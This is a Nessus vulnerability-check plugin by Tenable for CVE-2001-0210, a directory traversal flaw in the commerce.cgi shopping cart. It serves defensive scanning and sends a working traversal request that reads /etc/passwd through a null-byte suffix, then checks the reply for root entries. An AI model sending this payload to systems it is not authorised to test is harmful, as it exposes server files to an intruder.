#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if(description)
{
 script_id(10612);
 script_version ("$Revision: 1.22 $");
 script_cve_id("CVE-2001-0210");
 script_bugtraq_id(2361);
 script_xref(name:"OSVDB", value:"508");
 
 script_name(english:"Commerce.CGI Shopping Cart commerce.cgi page Parameter Traversal Arbitrary File Access");
 script_summary(english:"Checks for the presence of /cgi-bin/commerce.cgi");
 
 script_set_attribute(
   attribute:"synopsis",
   value:string(
     "A web application running on the remote host has a directory\n",
     "traversal vulnerability."
   )
 );
 script_set_attribute(
   attribute:"description", 
   value:string(
     "The 'commerce.cgi' CGI is installed.  This CGI has a well known\n",
     "security flaw that lets an attacker read arbitrary files with the\n",
     "privileges of the web server."
   )
 );
 script_set_attribute(
   attribute:"see_also",
   value:"http://archives.neohapsis.com/archives/bugtraq/2001-02/0208.html"
 );
 script_set_attribute(
   attribute:"solution", 
   value:"Upgrade to the latest version of this software."
 );
 script_set_attribute(
   attribute:"cvss_vector", 
   value:"CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N"
 );
 script_end_attributes();

 script_category(ACT_GATHER_INFO);
 script_family(english:"CGI abuses");
 
 script_copyright(english:"This script is Copyright (C) 2001-2009 Tenable Network Security, Inc.");
 script_dependencie("http_version.nasl", "find_service1.nasl", "no404.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

foreach dir (cgi_dirs())
{
 url = string(dir, '/commerce.cgi?page=../../../../../etc/passwd%00index.html');
 r = http_send_recv3(method:"GET", item:url, port:port);
 if( isnull(r) ) exit(0);

 if(egrep(pattern:".*root:.*:0:[01]:.*", string:r[2]))
 	{
	security_warning(port);
	exit(0);
	}
}
